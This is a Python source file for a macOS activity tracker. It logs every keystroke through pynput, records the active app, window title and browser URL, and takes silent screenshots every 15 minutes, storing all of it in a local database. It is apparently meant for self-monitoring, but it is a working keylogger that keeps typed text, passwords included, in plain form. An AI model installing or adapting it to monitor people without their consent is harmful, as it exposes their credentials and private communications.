import time
import subprocess
import threading
import os
from datetime import datetime
from pynput import keyboard
from database import init_db, log_event, log_screenshot

# Global variables to store typing stats in the current interval
current_keys_typed = []
keys_lock = threading.Lock()

def on_press(key):
    global current_keys_typed
    with keys_lock:
        try:
            # Store alphanumeric keys directly
            if key.char is not None:
                current_keys_typed.append(key.char)
        except AttributeError:
            # Store special keys
            if key == keyboard.Key.space:
                current_keys_typed.append(" ")
            elif key == keyboard.Key.enter:
                current_keys_typed.append("\n")
            elif key == keyboard.Key.tab:
                current_keys_typed.append("\t")
            elif key == keyboard.Key.backspace:
                current_keys_typed.append("[BS]")
            else:
                # We can ignore other control keys to keep the log relatively clean
                pass

def get_active_window_info():
    script = """
    tell application "System Events"
        set frontApp to first application process whose frontmost is true
        set appName to name of frontApp
    end tell

    if appName is "Google Chrome" then
        tell application "Google Chrome"
            try
                set windowTitle to title of active tab of front window
                set windowUrl to URL of active tab of front window
                return appName & "|||" & windowTitle & "|||" & windowUrl
            on error
                return appName & "|||Unknown"
            end try
        end tell
    else if appName is "Safari" then
        tell application "Safari"
            try
                set windowTitle to name of front document
                set windowUrl to URL of front document
                return appName & "|||" & windowTitle & "|||" & windowUrl
            on error
                return appName & "|||Unknown"
            end try
        end tell
    else
        tell application "System Events"
            try
                set windowTitle to name of front window of application process appName
                return appName & "|||" & windowTitle
            on error
                return appName & "|||Unknown"
            end try
        end tell
    end if
    """
    try:
        # We use strict check_output timeout to avoid hangs
        output = subprocess.check_output(['osascript', '-e', script], timeout=2)
        decoded = output.decode('utf-8').strip()
        parts = decoded.split('|||')
        app_name = parts[0]
        window_title = parts[1] if len(parts) > 1 else ""
        window_url = parts[2] if len(parts) > 2 else ""
        # Re-attach URL cleanly if present for old codebase format, or pass URL directly if we re-write the db schema
        # Since we're keeping `window_title` as the DB column, we'll store them as a combined string but cleanly separated by a distinct delimiter so `app.py` can parse it.
        if window_url:
             window_title = f"{window_title} [URL_SEP] {window_url}"
             
        return app_name, window_title
    except Exception as e:
        return None, None

def tracking_loop():
    global current_keys_typed
    
    interval = 5  # Log an event every 5 seconds
    print(f"Starting tracking loop. Logging every {interval} seconds...")
    
    # Setup Screenshots Directory
    SCREENSHOT_DIR = os.path.join(os.path.dirname(__file__), 'static', 'screenshots')
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    last_screenshot_time = time.time()
    
    while True:
        time.sleep(interval)
        
        current_time = time.time()
        
        # Take screenshot every 15 minutes (900 seconds)
        if current_time - last_screenshot_time >= 900:
            timestamp_str = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            filename = f"screenshot_{timestamp_str}.png"
            filepath = os.path.join(SCREENSHOT_DIR, filename)
            try:
                # -x disables sound, native mac utility
                subprocess.run(["screencapture", "-x", filepath])
                log_screenshot(f"screenshots/{filename}")
            except Exception as e:
                print(f"Failed to capture screenshot: {e}")
            
            last_screenshot_time = current_time

        app_name, window_title = get_active_window_info()
        
        with keys_lock:
            # Safely grab the keystrokes and clear the buffer
            keys_text = "".join(current_keys_typed)
            keys_count = len(current_keys_typed)
            current_keys_typed = []
            
        if app_name is not None:
            log_event(app_name, window_title, keys_count, keys_text)

if __name__ == '__main__':
    # Initialize DB (creates table if not exists)
    init_db()
    
    # Start the keylogger in a background thread
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    # Start the tracking loop on the main thread
    try:
        tracking_loop()
    except KeyboardInterrupt:
        print("Stopping tracker...")
        listener.stop()
